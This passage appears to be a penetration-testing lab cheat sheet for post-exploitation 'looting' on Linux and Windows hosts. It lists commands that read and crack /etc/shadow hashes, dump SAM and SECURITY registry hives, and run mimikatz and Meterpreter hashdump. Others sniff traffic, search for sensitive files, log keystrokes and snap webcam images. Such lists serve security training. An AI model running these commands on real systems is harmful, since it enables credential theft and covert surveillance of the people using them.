echo -e '\n'HOSTNAME:   && hostname && echo -e '\n'WHOAMI:   && whoami && echo -e '\n'PROOF:  && cat proof.txt && echo -e '\n'IFCONFIG:  && /sbin/ifconfig && echo -e '\n'PASSWD:  && cat /etc/passwd && echo -e '\n'SHADOW:  && cat /etc/shadow && echo -e '\n'NETSTAT:  && netstat -antup
```


### Network secret

```
/root/network-secret.txt
```

### Passwords and hashes

```
cat /etc/passwd
cat /etc/shadow

unshadow passwd shadow > unshadowed.txt
john --rules --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt
```

### Dualhomed

```
ifconfig
ifconfig -a
arp -a
```

### Tcpdump

```
tcpdump -i any -s0 -w capture.pcap
tcpdump -i eth0 -w capture -n -U -s 0 src not 10.11.1.111 and dst not 10.11.1.111
tcpdump -vv -i eth0 src not 10.11.1.111 and dst not 10.11.1.111
```

### Interesting files

```
#Meterpreter
search -f *.txt
search -f *.zip
search -f *.doc
search -f *.xls
search -f config*
search -f *.rar
search -f *.docx
search -f *.sql
use auxiliary/sniffer/psnuffle

.ssh:
.bash_history
```

### Databases

### SSH-Keys

### Browser

### Mail

```
/var/mail
/var/spool/mail
```

### GUI

If there is a gui we want to check out the browser.

```
echo $DESKTOP_SESSION
echo $XDG_CURRENT_DESKTOP
echo $GDMSESSION
```

## Windows

### Proof
```
hostname && whoami.exe && type proof.txt && ipconfig /all
```

### Passwords and hashes

```
wce32.exe -w
wce64.exe -w
fgdump.exe

# Loot passwords without tools
reg.exe save hklm\sam c:\sam_backup
reg.exe save hklm\security c:\security_backup
reg.exe save hklm\system c:\system

# Meterpreter
hashdump
load mimikatz
msv
```

### Dualhomed

```
ipconfig /all
route print

# What other machines have been connected
arp -a
```

### Tcpdump

```
# Meterpreter
run packetrecorder -li
run packetrecorder -i 1
```

### Interesting files

```
#Meterpreter
search -f *.txt
search -f *.zip
search -f *.doc
search -f *.xls
search -f config*
search -f *.rar
search -f *.docx
search -f *.sql
hashdump
keysscan_start
keyscan_dump
keyscan_stop
webcam_snap

# How to cat files in meterpreter
cat c:\\Inetpub\\iissamples\\sdk\\asp\\components\\adrot.txt

# Recursive search
dir /s
```
